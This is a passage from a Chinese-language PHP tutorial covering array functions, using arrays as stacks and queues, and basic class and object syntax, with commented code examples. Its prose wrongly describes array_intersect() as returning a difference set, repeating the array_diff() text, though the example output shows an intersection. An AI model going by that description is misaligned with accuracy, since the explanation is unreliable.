<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp=array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);     //声明一个索引数组$lamp包含4个元素</div><div class="line">	//使用array_slice()从第二个开始取(0是第一个，1为第二个)，取两个元素从数组$lamp中返回</div><div class="line">	print_r(array_slice($lamp,1,2));                    //输出：Array ( [0] =&gt; Apache [1] =&gt; MySQL )</div><div class="line">	//第二个参数使用负数参数为-2，从后面第二个开始取，返回一个元素</div><div class="line">	print_r(array_slice($lamp,-2,1));                   //输出： Array ( [0] =&gt; MySQL ) </div><div class="line">	//最后一个参数设置为 true，保留原有的键值返回</div><div class="line">	print_r(array_slice($lamp,1,2,true));               //输出：Array ( [1] =&gt; Apache [2] =&gt; MySQL ) </div><div class="line"></div><div class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;,&quot;c&quot;=&gt;&quot;MySQL&quot;,&quot;d&quot;=&gt;&quot;PHP&quot;);     //声明一个关联数组</div><div class="line">   	//如果数组有字符串键，默认所返回的数组将保留键名</div><div class="line">	print_r(array_slice($lamp,1,2));                    //输出：Array ( [b] =&gt; Apache [c] =&gt; MySQL ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数array-splice"><a href="#函数array-splice" class="headerlink" title="函数array_splice()"></a>函数array_splice()</h4><p>array_splice()和array_slice()函数类似，选择数组中的一系列元素，但不返回，而是删除他们并用其他值代理。如果提供了第四个参数，则之前选中的那些元素将被第四个参数指定的数组取代，最后生成的数组将会返回。<br>第一个参数array为必选项，规定要处理的数组。第二个参数offset也是必选项，调用时传入数值。如果offset为正数，则输入数组中该值指定的偏移量开始移除，如果offset为负，则从输入数组末尾倒数该值指定的偏移量开始移除。第三个参数length是可选的，也需要一个数值，如果省略该参数，则移除数组中从offset到结尾的所有部分。如果指定了length并且为正值，则移除这么多元素。如果指定了length且为负值，则移除从offset到数组末尾倒数length为止中间所有的元素。第四个参数array也是可选的，被移除的元素由此数组中的元素替代。如果没有移除任何值，则此数组中的元素将插入到指定位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$input = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</div><div class="line">	array_splice($input, 2);      	 //原数组中的第二个元素后到数组结尾都被删除</div><div class="line">	print_r($input);                 //输出：Array ( [0] =&gt; Linux [1] =&gt; Apache )</div><div class="line"></div><div class="line">	$input = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</div><div class="line">	array_splice($input, 1, -1);     //从第二个开始移除直到数组末尾倒数1个为止中间所有的元素</div><div class="line">	print_r($input);                 //输出：Array ( [0] =&gt; Linux [1] =&gt; PHP )</div><div class="line"></div><div class="line">	$input = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</div><div class="line">	array_splice($input, 1, count($input), &quot;web&quot;);      //从第二个元素到数组结尾都被第4个参数替代</div><div class="line">	print_r($input);                                    //输出：Array ( [0] =&gt; Linux [1] =&gt; web )</div><div class="line"></div><div class="line">	$input = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</div><div class="line">	array_splice($input, -1, 1, array(&quot;web&quot;, &quot;www&quot;));  //最后一个元素被第4个参数数组替代</div><div class="line">	print_r($input); //输出：Array ( [0] =&gt; Linux [1] =&gt; Apache [2] =&gt; MySQL [3] =&gt; web [4] =&gt; www )</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数array-combine"><a href="#函数array-combine" class="headerlink" title="函数array_combine()"></a>函数array_combine()</h4><p>array_combine()函数的作用是通过合并两个数组来创建一个新数组。其中的一个数组是键名，另一个数组的值为键值。如果其中一个数组为空，或者两个数组的元素个数不同，则该函数返回false。<br>该函数有两个参数且都是必选项，两个参数必须有相同数目的元素。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$a1=array(&quot;OS&quot;,&quot;WebServer&quot;,&quot;DataBase&quot;,&quot;Language&quot;);    //声明第一个数组作为参数1</div><div class="line">	$a2=array(&quot;Linux&quot;,&quot;Apache&quot;,&quot;MySQL&quot;,&quot;PHP&quot;);            //声明第二个数组作为参数2</div><div class="line">	print_r(array_combine($a1,$a2));                      //使用arrray_combine()将两个数组合并</div><div class="line">//输出：Array ( [OS] =&gt; Linux [WebServer] =&gt; Apache [DataBase] =&gt; MySQL [Language] =&gt; PHP )</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数array-merge"><a href="#函数array-merge" class="headerlink" title="函数array_merge()"></a>函数array_merge()</h4><p>array_merge()函数的作用是把一个或多个数组合并为一个数组，如果键名有重复，该键的键值为最后一个键名的值（后面的覆盖前面的）。如果数组是数字索引的，则键名会以连续方式重新索引。注意如果仅仅向array_merge()函数输入了一个数组，且键名是整数，则该函数将返回带有整数键名的新数组，其键名以0开始进行重新索引。<br>该函数第一个参数是必选项，需要传入一个数组。可以有多个可选参数。但必须都是数组类型的数据。返回将多个数组合并后的新数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$a1=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;);</div><div class="line">	$a2=array(&quot;c&quot;=&gt;&quot;MySQL&quot;,&quot;b&quot;=&gt;&quot;PHP&quot;);</div><div class="line">	print_r(array_merge($a1,$a2)); 	//输出： Array ( [a] =&gt; Linux [b] =&gt; PHP [c] =&gt; MySQL ) </div><div class="line">	</div><div class="line">	//仅使用一个数组参数则键名以0开始进行重新索引</div><div class="line">	$a=array(3=&gt;&quot;PHP&quot;,4=&gt;&quot;MySQL&quot;);</div><div class="line">	print_r(array_merge($a));	 //输出：Array ( [0] =&gt; PHP [1] =&gt; MySQL ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数array-intersect"><a href="#函数array-intersect" class="headerlink" title="函数array_intersect()"></a>函数array_intersect()</h4><p>array_intersect()函数的作用是返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的元素值。返回的数组中，键名保持不变。<br>第一个参数是必选项，传入与其他数组进行比较的数组。第二个参数也是必选项，传入与第一个数组进行比较的数组。可以有多个可选参数作为以后的参数，与第一个数组进行比较的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$a1=array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);  	  //声明第一个数组，作为比较的第一个参数</div><div class="line">	$a2=array(&quot;Linux&quot;, &quot;Tomcat&quot;, &quot;MySQL&quot;, &quot;JSP&quot;);     //声明第二个数组，作为比较的第二个参数</div><div class="line">	print_r(array_intersect($a1,$a2));                //输出Array ( [0] =&gt; Linux [2] =&gt; MySQL ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="函数array-diff"><a href="#函数array-diff" class="headerlink" title="函数array_diff()"></a>函数array_diff()</h4><p>array_diff()函数的作用是返回两个数组的差集数组。该数组包括了所有在被比较的数组中，但是不在任何其他参数数组中的元素值。在返回到数组中，键名保持不变。<br>第一个参数是必选项，传入与其他数组进行比较的数组。第二个参数也是必选项，传入与第一个数组进行比较的数组。第三个参数以后都是可选项，可用一个或任意多个数组与第一个数组进行比较，本函数仅有值用于比较。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$a1=array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);    //声明第一个数组，作为比较的第一个参数</div><div class="line">	$a2=array(&quot;Linux&quot;, &quot;Tomcat&quot;, &quot;MySQL&quot;, &quot;JSP&quot;);    //声明第二个数组，作为比较的第二个参数</div><div class="line">	print_r(array_diff($a1,$a2));                    //输出:Array ( [1] =&gt; Apache [3] =&gt; PHP ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="数组与数据结构"><a href="#数组与数据结构" class="headerlink" title="数组与数据结构"></a>数组与数据结构</h3><h4 id="使用数组实现堆栈"><a href="#使用数组实现堆栈" class="headerlink" title="使用数组实现堆栈"></a>使用数组实现堆栈</h4><p>堆栈是数据结构的一种实现形式，是使用非常广泛的存储数据的一种容器。在堆栈这种容器中，最后压入的数据（进栈），将会被最先弹出（出栈）。即在数据存储事采用“先进后出”的数据结构。在PHP中，将数组当做一个栈，使用array_push()和array_pop()两个系统函数即可完成数据的进栈和出栈操作。</p>
<p>array_push()函数向第一个参数的数组尾部添加一个或者多个元素(入栈),然后返回新数组的长度。该函数等于多次调用$array[]=$value。<br>该函数的第一个参数是必选的，作为栈容器的第一个数组。第二个参数也是必选的，在第一个参数中的数组尾部添加的一个数据。还可以有多个可选参数，都可以添加到第一个参数的数组中的尾部，即入栈。但要注意计时数组中有字符串键名，添加的元素也始终是数字键，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp=array(&quot;Web&quot;);             	//声明一个数当作为栈，数为数组array_push()函数第一个参数</div><div class="line">	echo array_push($lamp,&quot;Linux&quot;);   	//将字符串”Linux”压入数组$lamp中，返回数组中元素个数2</div><div class="line">	print_r($lamp);                		//输出数组中（栈）成员：Array ( [0] =&gt; Web [1] =&gt; Linux )</div><div class="line"></div><div class="line">     	//又连续压入三个数据到数组$lamp的尾部</div><div class="line">	echo array_push($lamp,&quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);    //输出栈中元素的长度为5</div><div class="line">	print_r($lamp);    //输出： Array ( [0] =&gt; Web [1] =&gt; Linux [2] =&gt; Apache [3] =&gt; MySQL [4] =&gt; PHP )</div><div class="line"></div><div class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;);    	    //带有字符串键的数组</div><div class="line">	echo array_push($lamp,&quot;MySQL&quot;,&quot;PHP&quot;);     	     //压入两个元素到数组的尾部, 输出栈长度为4</div><div class="line">	print_r($lamp);    // Array ( [a] =&gt; Linux [b] =&gt; Apache [0] =&gt; MySQL [1] =&gt; PHP )   //也是数字键</div><div class="line">   </div><div class="line">    	$lamp[&quot;web&quot;]=&quot;www&quot;;   //使用array_push()函数和使用这种直接赋值初使化数组的方式是一样的</div><div class="line">	print_r($lamp);       //Array ( [a] =&gt; Linux [b] =&gt; Apache [0] =&gt; MySQL [1] =&gt; PHP [web] =&gt; www )</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>array_pop()函数删除数组中的最后一个元素，即将数组最后一个单元弹出（出栈），并将数组的长度减1，如果数组为空（或者不是数组）将返回NULL。<br>该函数只有一个参数，即作为栈的数组。返回弹出的数组中最后一个元素的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp=array(&quot;Linux&quot;,&quot;Apache&quot;,&quot;MySQL&quot;, &quot;PHP&quot;); //声明一个数组作为栈</div><div class="line"></div><div class="line">	echo array_pop($lamp);  //弹出数组中最后的元素并返回被删除的值，输出PHP</div><div class="line">	print_r($lamp);         //被弹出后的结果:Array ( [0] =&gt; Linux [1] =&gt; Apache [2] =&gt; MySQL ) </div><div class="line"></div><div class="line">	echo array_pop($lamp);  //再弹出数组中最后的元素并返回被删除的值，输出MySQL</div><div class="line">	print_r($lamp);         //被弹出后的结果:Array ( [0] =&gt; Linux [1] =&gt; Apache ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="使用数组实现队列"><a href="#使用数组实现队列" class="headerlink" title="使用数组实现队列"></a>使用数组实现队列</h4><p>PHP中的数组处理函数还可以将数组实现队列的操作。堆栈是“后劲先出”，而一个队列则允许在一段插入数据，在另一端删除数据，也就是实现最先进入队列的数据最先退出队列，即队列是“先进先出”的原则。<br>函数array_shift()可以实现删除数组中的第一个元素，并返回被删除元素的值。<br>该函数只有一个必选参数，其参数为实现队列的数组。将数组中的第一个单元一处并作为结构返回，并将数组的长度减1，还将所有其他的元素向前移动一位。所有的数字键名将改为0开始计数，字符串键名将保持不变。如果数组为空（或不是数组），则返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">	//带有字符串键值的关联数组</div><div class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;, &quot;b&quot;=&gt;&quot;Apache&quot;, &quot;c&quot;=&gt;&quot;MySQL&quot;, &quot;d&quot;=&gt;&quot;PHP&quot;);</div><div class="line">	echo array_shift($lamp);  //删除数组第一个元素并返回，输出Linux</div><div class="line">	print_r ($lamp);          //字符串键值保持不变：Array ( [b] =&gt; Apache [c] =&gt; MySQL [d] =&gt; PHP )</div><div class="line"></div><div class="line">	//带有数字键的索引数组</div><div class="line">	$lamp=array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</div><div class="line">	echo array_shift($lamp);   //删除数组第一个元素并返回，输出Linux</div><div class="line">	print_r ($lamp);           //数字下标重新索引Array ( [0] =&gt; Apache [1] =&gt; MySQL [2] =&gt; PHP ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>在PHP中还可以使用array_unshift()函数在队列数组的开头插入一个或者多个元素，该函数执行成功将返回插入元素个数，使用格式和函数array_push()是一样的。</p>
<h3 id="其他有用的数组处理函数"><a href="#其他有用的数组处理函数" class="headerlink" title="其他有用的数组处理函数"></a>其他有用的数组处理函数</h3><h4 id="函数array-rand"><a href="#函数array-rand" class="headerlink" title="函数array_rand()"></a>函数array_rand()</h4><p>array_rand()函数从数组中随机选出一个或多个元素，并返回。该函数有两个参数，第一个参数为必选项，它接受一个数组作为输入数组，从这个数组中随机选出一个或多个元素。第二个参数是一个可选的参数，指明了你想取出多少个元素，如果没有指定，默认从数组中取出一个元素。如果只取出一个，array_rand()函数返回一个随机元素的键名，否则就返回一个包含随机键名的数组。这样就可以随机从数组中取出键名和值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;, &quot;b&quot;=&gt;&quot;Apache&quot;, &quot;c&quot;=&gt;&quot;MySQL&quot;, &quot;d&quot;=&gt;&quot;PHP&quot;);</div><div class="line">	echo array_rand($lamp,1);           	     //随机从数组$lamp中取1个元素的键值，例如b</div><div class="line">	echo $lamp[array_rand($lamp)].&quot;&lt;br&gt;&quot;; 	     //通过随机的一个元素的键值获取数组中一个元素的值</div><div class="line">	$key=array_rand($lamp,2);           	     //随机从数组$lamp中取2个元素的键值赋给数组$key</div><div class="line">	echo $lamp[$key[0]].&quot;&lt;br&gt;&quot;;         	     //通过数组$key中第一个值获取数组$lamp中一个元素的值</div><div class="line">	echo $lamp[$key[1]].&quot;&lt;br&gt;&quot;;          	     //通过数组$key中第二个值获取数组$lamp中另个元素的值</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数shuffle"><a href="#函数shuffle" class="headerlink" title="函数shuffle()"></a>函数shuffle()</h4><p>shuffle()函数把数组中的元素按随机顺序重新排列，即将数组中的顺序打乱。若成功则返回TRUE，否则返回FALSE。只需要一个数组作为参数，每执行一次则返回不同顺序的数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;, &quot;b&quot;=&gt;&quot;Apache&quot;, &quot;c&quot;=&gt;&quot;MySQL&quot;, &quot;d&quot;=&gt;&quot;PHP&quot;);</div><div class="line">	shuffle($lamp);     //将传入的数组$lamp按随机顺序重新排列</div><div class="line">	print_r($lamp);     //每执行一次shuffle()函数则返回不同顺序的数组</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数array-sum"><a href="#函数array-sum" class="headerlink" title="函数array_sum()"></a>函数array_sum()</h4><p>array_sum()函数返回数组中所有值的总和。只需要换入一个数组作为必选参数即可。如果所有值都是整数，则返回一个整数值，如果其中有一个或多个值是浮点数，则返回浮点数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$a=array(0=&gt;&quot;5&quot;,1=&gt;&quot;15&quot;,2=&gt;&quot;25&quot;);</div><div class="line">	echo array_sum($a);               //使用array_sum()函数返回数组中元素的总各，输出：45</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数range"><a href="#函数range" class="headerlink" title="函数range()"></a>函数range()</h4><p>range()函数创建并返回一个包含指定范围的元素的数组。该函数需要三个参数，第一个参数first为必选项，规定数组元素的最小值。第二个参数second也是必选项，规定数组中元素的最大值。第三个参数step是可选的，规定元素之间的步进制，默认为1。该函数创建一个数组，包含从first到second（包含）之间的整数或字符。如果second比first小，则返回反序的数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$number = range(0,5);  	   //使用range()函数声明元素值为0-5的数组</div><div class="line">	print_r ($number);         //获得的数组输出Array ( [0] =&gt; 0 [1] =&gt; 1 [2] =&gt; 2 [3] =&gt; 3 [4] =&gt; 4 [5] =&gt; 5 ) </div><div class="line"></div><div class="line">	$number = range(0,50,10);  //使用range()函数声明元素值为0-50的数组，每个元素之间的步长为10</div><div class="line">	print_r ($number);         //输出Array ( [0] =&gt; 0 [1] =&gt; 10 [2] =&gt; 20 [3] =&gt; 30 [4] =&gt; 40 [5] =&gt; 50 ) </div><div class="line"></div><div class="line">	$letter = range(&quot;a&quot;,&quot;d&quot;);  //还可以使用range()函数声明元素连续的字母数组，声明字母a-d的数组</div><div class="line">	print_r ($letter);         //获得的数组输出Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c [3] =&gt; d ) </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h1 id="PHP面向对象的程序设计"><a href="#PHP面向对象的程序设计" class="headerlink" title="PHP面向对象的程序设计"></a>PHP面向对象的程序设计</h1><h2 id="如何抽象一个类"><a href="#如何抽象一个类" class="headerlink" title="如何抽象一个类"></a>如何抽象一个类</h2><h3 id="类的声明"><a href="#类的声明" class="headerlink" title="类的声明"></a>类的声明</h3><p>使用一个关键词class后面加上一个自定义的类别名称，以及加上一对花括号就可以了。有时也需要在class关键字的前面加一些修饰类的关键字。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[一些修饰类的关键字]class 类名｛				//使用class关键字加空格再加上类名，后面加上一对花括号</div><div class="line">		类中成员;				//类中的成员可以成员属性和成员方法</div><div class="line">｝							//使用花括号结束类的声明</div></pre></td></tr></table></figure>
<p>类名和变量名还有函数名命名规则相似，都需要遵守PHP中自定义名称的命名规则，如果由多个单词组成，习惯上每个单词的首字母要大写。另外类名的定义也要具有一定的意义，不要随便由几个字母组成。</p>
<h3 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h3><p>在类中直接声明变量就称为成员属性，可以在类中声明多个变量，即对象中有多个成员属性，每个变量都存储对象不同的属性信息。成员属性可以使用PHP中的标量类型和复合类型，所以也可以是其他类实例化的对象，但在类中使用资源和空类型没有意义。另外，虽然在声明成员属性时可以给变量赋予初值，但是在声明类时没有必要的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">class Person&#123;</div><div class="line">	var $name;			//第一个成员属性，用于存储人的名字</div><div class="line">	var $age;			//第二个成员属性，用于存储人的年龄</div><div class="line">	var $sex;			//第三个成员属性，用于存储人的性别</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在成员属性前可以加public,private,static等关键字来修饰，一旦成员属性有其他的关键字修饰就需要去掉”var”。</p>
<h3 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h3><p>在对象中需要声明一些可以操作本对象成员属性的一些方法，来完成对象的一些行为。在类中直接声明的函数就称为成员方法，可以在类中声明多个函数，即对象中就有多个成员方法。成员方法的声明和函数的声明完全一样，只不过可以加上一些关键字的修饰来控制成员方法的一些权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Phone &#123;                      //声明电话类</div><div class="line">        	//声明4个与电话有关的成员属性</div><div class="line">		var $Manufacturers;        //第一个成员属性，用于存储电话的厂商</div><div class="line">		var $color;                //第二个成员属性，用来设置电话的外关颜色</div><div class="line">		var $Battery_capacity;     //第三个成员属性，用来定义电话的电池容量</div><div class="line">		var $screen_size;          //第四个成员属性，用来定义电话的屏幕尺寸</div><div class="line"></div><div class="line">		function call()&#123;          //第一个成员方法用来声明电话具有接打电话的功能</div><div class="line">		    	//方法体，可以是打电话的具体内容</div><div class="line">               		echo &quot;正在打电话&quot;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function message()&#123;       //第二个成员方法用来声明电话具有发信息的功能</div><div class="line">		        //方法体，可以是发送的具体信息</div><div class="line">               		echo &quot;正在发信息&quot;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function playMusic() &#123;    //第三个成员方法用来声明电话具有播放音乐的功能</div><div class="line">		    	//方法体，可以是播放的具体音乐</div><div class="line">             		echo &quot;正在播放音乐&quot;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function photo() &#123;         //第四个成员方法用来声明电话具有拍照的功能</div><div class="line">		     	//方法体，可以是拍照的整个过程</div><div class="line">               		echo &quot;正在拍照&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h2 id="通过类实例化对象"><a href="#通过类实例化对象" class="headerlink" title="通过类实例化对象"></a>通过类实例化对象</h2><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>将类实例化成对象使用new关键字并在后面加上一个和类名同名的方法即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$变量名=new 类名称([参数数列表])；   //对象实例化格式</div></pre></td></tr></table></figure></p>
<p>其中，“$变量名”是通过类所创建的一个对象的引用名称，将来通过这个引用来访问对象中的成员。new表明要创建一个新的对象，类名表示新对象的类型，而参数指定了类的构造方法用于初始化对象值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Phone &#123;             //声明一个电话类Phone</div><div class="line">		//类中成员同上（略）</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	class Person &#123;            //声明一个人类Person</div><div class="line">		//类中成员同上（略）</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	//通过Person类实例化三个对象$person1、$person2、$person3</div><div class="line">	$person1=new Person();    //创建第一个Person类对象,引用名为$person1</div><div class="line">	$person2=new Person();    //创建第二个Person类对象,引用名为$person2</div><div class="line">	$person3=new Person();    //创建第三个Person类对象,引用名为$person3</div><div class="line"></div><div class="line">	//通过Phone类实例化三个对象$phone1、$phone2、$phone3</div><div class="line">	$phone1=new Phone();    //创建第一个Phone类对象,引用名为$phone1</div><div class="line">	$phone2=new Phone();    //创建第二个Phone类对象,引用名为$phone2</div><div class="line">	$phone3=new Phone();    //创建第三个Phone类对象,引用名为$phone3</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="对象类型在内存中的分配"><a href="#对象类型在内存中的分配" class="headerlink" title="对象类型在内存中的分配"></a>对象类型在内存中的分配</h3><p>对象类型和整型、字符串等类型一样，也是PHP中的一种数据类型。逻辑上内存大体上被分为四段，分别为栈空间段、堆空间段、初始化数据段和代码段，程序中不同类型数据的声明将会被存放在不同的内存段里面。</p>
<h4 id="栈空间段"><a href="#栈空间段" class="headerlink" title="栈空间段"></a>栈空间段</h4><p>栈的特点是空间小但被CPU访问的速度快，是用户存放程序中临时创建的变量。由于栈的后进先出特点，所以栈特别方便用来保存和恢复调用现场。</p>
<h4 id="堆空间段"><a href="#堆空间段" class="headerlink" title="堆空间段"></a>堆空间段</h4><p>堆是用于存放进程运行中被动态分配的内存段，它大小并不固定，可动态扩张或所建。用于存储数据长度可变或占用内存比较大的数据。</p>
<h4 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h4><p>数据段用来存放可执行文件中已初始化全局变量，就是存放程序静态分配的变量。</p>
<h4 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h4><p>代码段是用来存放可执行文件的操作指令，也就是说它是可执行程序在内存中的镜像。代码段需要防止在运行时被非法修改，所以只准读取操作，不允许写入操作。</p>
<h3 id="对象中成员的访问"><a href="#对象中成员的访问" class="headerlink" title="对象中成员的访问"></a>对象中成员的访问</h3><p>对象中包含成员属性和成员方法，访问对象中的成员则包括成员属性的访问和成员方法的访问。而对成员属性的访问则又包括赋值操作和获取成员属性值的操作。访问对象中的成员和访问数组中的元素类似，只能通过对象的引用来访问对象中的每个成员。但还要使用一个特殊的运算符号“-&gt;”来完成对象成员的访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$引用名=new 类名称([参数数列表]);	//对象实例化格式</div><div class="line">$引用名-&gt;成员属性=值;				//对象成员属性赋值的操作</div><div class="line">echo $引用名-&gt;成员属性;				//获取成员属性的值</div><div class="line">$引用名-&gt;成员方法;				//访问对象中的成员方法</div></pre></td></tr></table></figure></p>
